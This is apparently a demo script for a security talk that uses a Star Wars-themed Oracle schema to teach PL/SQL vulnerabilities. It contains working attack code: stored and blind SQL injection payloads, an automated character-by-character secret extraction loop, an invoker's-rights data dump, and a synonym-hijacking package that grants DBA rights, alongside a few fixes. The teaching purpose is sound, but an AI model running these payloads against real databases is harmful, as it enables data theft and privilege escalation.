/****************** Setup ******************
  Run once:
    ../setup/setup_schema.sql to create the database users
      - DEATHSTAR (application)
      - DARTH_DBA (DBA)
    ../setup/setup_tables.sql to initially create the necessary tables and objects

  Run before every walkthrough:
    ../setup/reset_demo.sql

 */

set linesize 111
set pagesize 1000
set trimout on
column name format a30
column user_name format a30
column role_name format a30
column code format a60
column variable_name format a30
column package_name format a30
column USERNAME format a30
column GRANTED_ROLE format a30
column SECRET format a50
column CREATED format a30
column MESSAGE format a60
alter session set nls_date_format='dd.MM.yyyy hh:mi:ss';
cl scr
set echo on
------------------------------------------------------------------------------------
-- Episode 1: Die APEX-Bedrohung
------------------------------------------------------------------------------------
/***** DARTH ORA ******/
connect deathstar/deathstar
#pause
-- Let's have a look at the existing tables
select * from users;

#pause
select * from roles;

#pause
select * from user_roles;

#pause

select * from deathstar_rooms;
#pause
select * from user_room_access;

#pause
-- This is our main table of interest, storing some very nasty Imperial secrets!
desc imperial_secrets;

#pause
/***** Sabine (Attacker) ******/
-- Poison the deathstar_rooms table
-- In the talk, this is done via an APEX injection
update deathstar_rooms set code = 'VADER''); insert into user_roles (id_user, id_role) select u.id, r.id from users u, roles r
where (u.id, r.id) not in (select id_user, id_role from user_roles) and u.user_name in (''Rebel' where id = 2;
commit;
cl scr
------------------------------------------------------------------------------------
-- Episode 2: Angriff der Blind-Injections
------------------------------------------------------------------------------------
/***** DARTH ORA ******/
#pause

-- We have a simple package to get the id of a room by its name
create or replace package room_info as
  function get_room_id( i_name varchar2 ) return integer;
end;
/
#pause
create or replace package body room_info as
  function get_room_id( i_name varchar2 ) return integer
  as
    c_curs sys_refcursor;
    v_row deathstar_rooms%rowtype;
    l_id integer;
    begin
      open c_curs for
        'select * from deathstar_rooms
        where lower(name) like lower(''%' || i_name || '%'')';
      loop
        fetch c_curs into v_row;
        exit when c_curs%notfound or l_id is not null;
        dbms_output.put_line('Room found: ' || v_row.name);
        l_id := v_row.id;
      end loop;

      return l_id;
    end;
end;
/
#pause
cl scr
-- We want to be very forgiving with input
select room_info.get_room_id('Vader') from dual;
#pause
-- To prevent "Bobby Tables", we put our dynamic SQL inside of a
-- Cursor. We are therefore setting READ context for the statement
-- which cannot contain DML or DDL
select room_info.get_room_id('''); drop table deathstar_rooms;--') from dual;
#pause

/***** Sabine ******/

connect deathstar/deathstar

-- But what if we use the Injection vulnerability to query something stored
-- in a completely different table?
select deathstar.room_info.get_room_id(''') and exists(select 1 from imperial_secrets where id = 1 and lower(substr(secret, 1, 1)) = ''a'') --') result from dual;
#pause
/* Translates to:
select * from deathstar_rooms
   where lower(name) like lower('%')
   and exists(select 1 from imperial_secrets where id = 1
     and lower(substr(secret, 1, 1)) = 'a') --

If the first char of the SECRET column of the row with ID = 1 in IMPERIAL_SECRETS is 'a',
we get a result. Otherwise, we get no data.
This "blind injection attack" can even be done using a web interface
 */
#pause
-- Next we check for first char being 'b'
select deathstar.room_info.get_room_id(''') and exists(select 1 from imperial_secrets where id = 1 and lower(substr(secret, 1, 1)) = ''b'') --') result from dual;
#pause
-- Or maybe 'c'
select deathstar.room_info.get_room_id(''') and exists(select 1 from imperial_secrets where id = 1 and lower(substr(secret, 1, 1)) = ''c'') --') result from dual;
#pause
-- Okay, maybe it's a 'v'
select deathstar.room_info.get_room_id(''') and exists(select 1 from imperial_secrets where id = 1 and lower(substr(secret, 1, 1)) = ''v'') --') result from dual;
#pause

set serveroutput on
cl scr
-- Because we are coders, we let a program do the checking for us
declare
  l_secret varchar2(4000);

  function chk_char(i_idx integer)
    return varchar2
  as
    l_malicious_stmt varchar2(4000);
  begin
    for char_ascii in 1..90
      loop
        -- We loop through all ASCII chars 1-90 and create an injection addition
        -- that checks for the char at the given index being that ASCII char
        l_malicious_stmt :=
            ''') and exists(select 1 from imperial_secrets where id = 1 and' ||
            ' lower(substr(secret, ' || i_idx || ', 1)) = ''' || lower(chr(char_ascii)) || ''') --';
        if (deathstar.room_info.get_room_id(l_malicious_stmt) = 1) then
          -- If so, we return the char
          return chr(char_ascii);
        end if;
      end loop;
    -- If we couldn't find a match, we return '?'
    return '?';
  end chk_char;
#pause

begin
  begin
    for idx in 1..30
      loop
        -- Now we loop through the first 30 chars of the row with ID = 1
        -- and do our complete ASCII check for each position
        l_secret := l_secret || chk_char(idx);
      end loop;
  exception
    when others then
      dbms_output.put_line(sqlerrm);
  end;
  -- And finally, we know a secret
  dbms_output.put_line('Secret: ' || l_secret);
#pause
end;
/
#pause
-- This attack is also possible via web interface, using some
-- other program that does the same thing and sends manipulated HTTP requests

#pause
------------------------------------------------------------------------------------
-- Episode 3: Die Rache des Room-Codes
------------------------------------------------------------------------------------
/***** DARTH ORA ******/
#pause
-- We add a new method ALLOW_ROOM_ACCESS. It can be used to
-- define which user has access to which room in the deathstar.
create or replace package room_info as
  function get_room_id( i_name varchar2 ) return integer;

  procedure allow_room_access(
    i_room_id simple_integer,
    i_user_id simple_integer );
end;
/
#pause

create or replace package body room_info as
  function get_room_id( i_name varchar2 ) return integer
  as
    c_curs sys_refcursor;
    v_row deathstar_rooms%rowtype;
    l_id integer;
    begin
      open c_curs for
        'select * from deathstar_rooms where lower(name) like lower(''%' || i_name || '%'')';
      loop
        fetch c_curs into v_row;
        exit when c_curs%notfound or l_id is not null;
        dbms_output.put_line('Room found: ' || v_row.name);
        l_id := v_row.id;
      end loop;

      return l_id;
    end;

  procedure allow_room_access(
    i_room_id simple_integer,
    i_user_id simple_integer )
  as
    l_room_code varchar2(200);
    l_log_table varchar2(40) := 'LOG_'||to_char(sysdate, 'YYYYMM');
    begin
      insert into user_room_access ( id_user, id_room )
        select i_user_id, i_room_id
          from dual
          where (i_user_id, i_room_id) not in (
            select id_user, id_room from user_room_access);
#pause
      -- Logging: We need dyn. sql, because we want to log
      -- to a different table each month, e.g. LOG_201912
      -- The Empire has no money to pay for Oracle partitioning!
      select code into l_room_code from deathstar_rooms where id = i_room_id;
      execute immediate '
        begin
          insert into ' || dbms_assert.simple_sql_name(l_log_table) || ' ( message )
            values (''User ' || i_user_id ||
            ' has now access to room ' || l_room_code || ''');
        end;
      ';
      -- Of course we sanitized the name of the LOG-Table with DBMS_ASSERT methods
      -- and the i_user_id variable can't be anything but an integer.
      -- So we are pretty safe, aren't we?
    end;
end;
/
#pause
cl scr
/***** Sabine ******/
-- Remember our Injection from example 1?
-- We injected something into the CODE column that shouldn't be there
select code from deathstar.deathstar_rooms;
#pause
cl scr
/* The log command will be transformed to
execute immediate '
  begin
    insert into log_201912 ( message )
      values ('User 1 has now access to room VADER');
		insert into user_roles (id_user, id_role) select u.id, r.id from users u, roles r
			where (u.id, r.id) not in (select id_user, id_role from user_roles) and u.user_name in ('Rebel');
  end;
 */

#pause
cl scr
-- Let's check: We have no roles as Rebel
select * from deathstar.user_roles;
select * from deathstar.users;
#pause
-- But when at any point in time ALLOW_ROOM_ACCESS is called
-- for Room 2 (no matter which user given)
call deathstar.room_info.allow_room_access(2, 1);
#pause
-- We suddenly have ALL the roles as Rebel
select * from deathstar.user_roles;
#pause
-- And of course nothing is in the logs
select * from deathstar.log_201912;
#pause
------------------------------------------------------------------------------------
-- Episode 4: Invoker’s Hoffnung
------------------------------------------------------------------------------------
/***** DARTH ORA ******/
-- The deathstar data is protected - only the DEATHSTAR user can access the tables holding
-- all the information.
-- To give out specific information, ROOM_INFO package is created with DEFINER's rights.
-- This means, that a user gets the rights of DEATHSTAR inside the ROOM_INFO package and can
-- therefore access the DEATHSTAR tables (only) from within the package methods.
-- If we created ROOM_INFO with INVOKER's rights, no other user could use GET_ROOM_ID because
-- they would try to select from DEATHSTAR tables as this other user.
#pause
/***** Sabine ******/
-- Buuuuut we can also use INVOKER's rights to our advantage
-- Let's trick the DBA into giving us a user with RESOURCE rights
#pause
/***** DARTH ORA ******/
connect darth_dba/darth_dba
#pause
cl scr
create user sabine identified by sabine  default tablespace users quota unlimited on users;
grant connect to sabine;
grant resource to sabine;

#pause
/***** Sabine ******/
connect sabine/sabine
#pause
cl scr
-- Let's first of all create a table with a big varchar2 column
create table secret_dump (
  secret varchar2(4000),
  created timestamp default current_timestamp
);

#pause
cl scr
-- Then create a function with INVOKER's rights.
-- It should be an AUTONOMOUS TRANSACTION and use dynamic SQL to insert everything from
-- DEATHSTAR's IMPERIAL_SECRETS table into our new table - and commit
create or replace function bad_func
  return varchar2 authid current_user -- Invoker's rights!
  as
    pragma autonomous_transaction;
  begin
    execute immediate 'insert into sabine.secret_dump (secret) select secret from imperial_secrets';
    commit;
    return 'Y';
  end;
/

-- Of course we have no access to DEATHSTAR's tables, but we can grant the function
-- and also INSERT on our new table to PUBLIC
grant execute on bad_func to public;
grant insert on secret_dump to public;
#pause
cl scr

-- We can now exploit the existing SQL injection to call our bad function from within
-- the ROOM_INFO package, which is DEFINER's rights and therefore user DEATHSTAR.
select deathstar.room_info.get_room_id(''') and sabine.bad_func() = ''Y''--') from dual;
/* Select inside GET_ROOM_ID translates to:
select * from deathstar_rooms
   where lower(name) like lower('%')
   and sabine.bad_func() = 'Y' --
 */
#pause

-- What happened is:
--  1. We called GET_ROOM_ID (DEFINER'S rights, so user DEATHSTAR)
--  2. GET_ROOM_ID called BAD_FUNC (INVOKER's rights, so still user DEATHSTAR)
--  3. BAD_FUNC selected from IMPERIAL_SECRETS (allowed, because user DEATHSTAR)
--  4. BAD_FUNC inserted into SECRET_DUMP (allowed, because grant to PUBLIC)
select * from secret_dump;
#pause
------------------------------------------------------------------------------------
-- Episode 5: Der Admin schlägt zurück
------------------------------------------------------------------------------------
/***** DARTH ORA ******/
connect deathstar/deathstar
#pause
cl scr
-- Let's have a look at this vulnerable package
create or replace package pkg_control as

  v_user integer;

  function get_user return number;

  function get_user_role return varchar2;

end;
/
#pause
create or replace package body pkg_control as

  function get_user return number
  as
    v_id integer;
  begin
    return v_user;
  end get_user ;
#pause
  function get_user_role return varchar2
  as
    v_role_name roles.role_name%TYPE;
  begin

    select r.role_name
    into v_role_name
    from user_roles ur join roles r on (r.id = ur.id_role)
    where id_user = v_user;

    return v_role_name;
  end get_user_role;
#pause
begin -- init of the package
  if v_user is null then
    case sys_context('USERENV', 'SESSION_USER')
      when 'DARTH_DBA' then
        v_user := 1; -- Deathstar-DBA is Admin
      else
        v_user := 2; -- Default is READ
    end case;
  end if;
end;
/
#pause
cl scr
-- The idea is nice, the problem is, that the V_USER variable that is
-- initialized during Package initialization is publicly open for manipulation
create or replace package pkg_control as

  v_user integer;

  function get_user return number;

  function get_user_role return varchar2;

end;
/
#pause
cl scr
-- Normally, it should work that way
set serveroutput on
begin
  dbms_output.put_line( 'User-ID: ' || pkg_control.get_user );
  dbms_output.put_line( 'User-ROLE: ' || pkg_control.get_user_role );
end;
/
#pause
cl scr
-- But anyone could just manipulate the variable to get ADMIN role
begin
  pkg_control.v_user := 1;
  dbms_output.put_line( 'User-ID: ' || pkg_control.get_user );
  dbms_output.put_line( 'User-ROLE: ' || pkg_control.get_user_role );
end;
/
#pause
cl scr
-- Luckily we can use PLSCOPE to find such vulnerabilities
-- First recompile our whole schema to get PLSCOPE insights
ALTER SESSION SET PLSCOPE_SETTINGS='IDENTIFIERS:ALL, STATEMENTS:ALL';

begin
  DBMS_UTILITY.compile_schema(schema => 'DEATHSTAR', compile_all => true);
end;
/
#pause
cl scr
-- Now we can look for variables that are accessible from public
select name variable_name, object_name package_name, line
  from user_identifiers
  where object_type = 'PACKAGE'
    and usage = 'DECLARATION'
    and type = 'VARIABLE';
#pause
cl scr
-- The fix for this is easy: just move the variable to the body
create or replace package pkg_control as

  function get_user return number;

  function get_user_role return varchar2;

end;
/
#pause
create or replace package body pkg_control as

  v_user integer;

  function get_user return number
  as
    v_id integer;
  begin
    return v_user;
  end get_user ;
#pause
  function get_user_role return varchar2
  as
    v_role_name roles.role_name%TYPE;
  begin

    select r.role_name
    into v_role_name
    from user_roles ur join roles r on (r.id = ur.id_role)
    where id_user = v_user;

    return v_role_name;
  end get_user_role;

begin -- init des Packages
  if v_user is null then
    case sys_context('USERENV', 'SESSION_USER')
      when 'DARTH_DBA' then
        v_user := 1; -- Deathstar-DBA ist Admin
      else
        v_user := 2; -- Default ist READ
    end case;
  end if;
end;
/
#pause
cl scr
-- We don't have any vulnerabilities of that kind left
select name variable_name, object_name package_name, line
  from user_identifiers
  where object_type = 'PACKAGE'
    and usage = 'DECLARATION'
    and type = 'VARIABLE';
#pause
cl scr
begin
  dbms_output.put_line( 'User-ID: ' || pkg_control.get_user );
  dbms_output.put_line( 'User-ROLE: ' || pkg_control.get_user_role );
end;
/
#pause
cl scr
------------------------------------------------------------------------------------
-- Episode 6: Die Rückkehr des Social Engineers
------------------------------------------------------------------------------------
#pause
-- Let's have a look at this incredibly simple and safe function
create or replace function is_admin( i_username varchar2 )
 return integer
as
  begin
    if ( i_username = 'ADMIN') then
      return 1;
    else
      return 0;
    end if;
  end;
/
#pause
cl scr

select is_admin('ADMIN') from dual;

select is_admin('User') from dual;
#pause
cl scr
-- Nothing can happen here, right? RIGHT?
grant execute on is_admin to public;

#pause
/***** Sabine ******/
connect sabine/sabine
-- Well... not when we're messing around with Collations
ALTER SESSION SET NLS_SORT = BINARY_AI NLS_COMP = LINGUISTIC;
#pause
-- Ooops, ADMIN isn't what it's supposed to be
select deathstar.is_admin('aDMIN') from dual;
select deathstar.is_admin('Ädmin') from dual;

#pause
-- But how do we exploit this?
-- Let's convince the DBA to give us privilege to create a LOGON trigger
#pause
/***** DARTH_ORA ******/
connect darth_dba/darth_dba

grant administer database trigger to sabine;

#pause
cl scr
/***** Sabine ******/
connect sabine/sabine
#pause
cl scr
-- Now let's change the collation for everyone who logs into the database
create or replace trigger trg_client_detection
after logon
on database
begin
  execute immediate 'ALTER SESSION SET NLS_SORT = BINARY_AI NLS_COMP = LINGUISTIC';
end;
/
#pause
cl scr
-- Let's test this with DEATHSTAR
connect deathstar/deathstar
#pause
-- Now we can have have fun with Users of various names...
select is_admin('Ädmin') from dual;
#pause
cl scr

------------------------------------------------------------------------------------
-- Episode 7: Das Erwachen des Rebellen-DBAs
------------------------------------------------------------------------------------
-- Let's start to finally get DBA rights and end this!
#pause
connect sabine/sabine

-- We create a new package that has the same method signature as the very well known SYS.DBMS_OUTPUT
create or replace package malicious_dbms_output authid current_user as
  procedure put_line( i_input varchar2 );
end;
/
#pause
cl scr

-- The implementation of this package contains of 2 things:
create or replace package body malicious_dbms_output as

  -- A AUTONOMOUS_TRANSACTION procedure that tries to give DBA rights
  procedure grant_us_dba
  as
    pragma autonomous_transaction;
    begin
      execute immediate 'grant dba to sabine';
      sys.dbms_output.put_line('Granting succeeded!'); -- We wouldn't add this in a real scenario!
    -- Of course we catch any errors if something goes wrong
    exception when others then
      sys.dbms_output.put_line('Granting DBA not succeeded: ' || sqlerrm); -- We wouldn't add this in a real scenario!
      null;
    end;

  -- And the PUT_LINE method that first tries to GRANT dba and the calls the original method
  procedure put_line( i_input varchar2 )
  as
    begin
      grant_us_dba();
      sys.dbms_output.put_line(i_input);
    end;
end;
/
#pause
-- We grant it to public so everyone can use it
grant execute on malicious_dbms_output to public;
#pause
cl scr
-- At the moment, we don't have DBA privs
select username, granted_role from user_role_privs;
#pause
-- Now we should have CREATE ANY SYNONAM privilege...
#pause
cl scr
/***** DARTH_ORA ******/
connect darth_dba/darth_dba

grant create any synonym to sabine;
#pause
cl scr
/***** Sabine ******/
connect sabine/sabine
-- Let's create a synonym DBMS_OUTPUT for our malicious DBMS_OUTPUT for the other users
create synonym deathstar.dbms_output for malicious_dbms_output;
create synonym darth_dba.dbms_output for malicious_dbms_output;
#pause
-- For us, it doesn't work, because we're not a DBA
set serveroutput on
select deathstar.room_info.get_room_id('Vader') from dual;
-- but we know one....
#pause
cl scr
/***** DARTH_ORA ******/
connect darth_dba/darth_dba
declare
  l_room_id integer;
begin
  l_room_id := deathstar.room_info.get_room_id('Jar Jars Badewanne');
  dbms_output.put_line('ID: ' || l_room_id);
end;
/
-- Everything is okay!
#pause
cl scr
/***** Sabine ******/
connect sabine/sabine

-- Now we have everything we want!
select username, granted_role from user_role_privs;

/****************************************************
  GAME OVER
*****************************************************/

-- TODO: Explanation why INHERIT_PRIVILEGES didn't work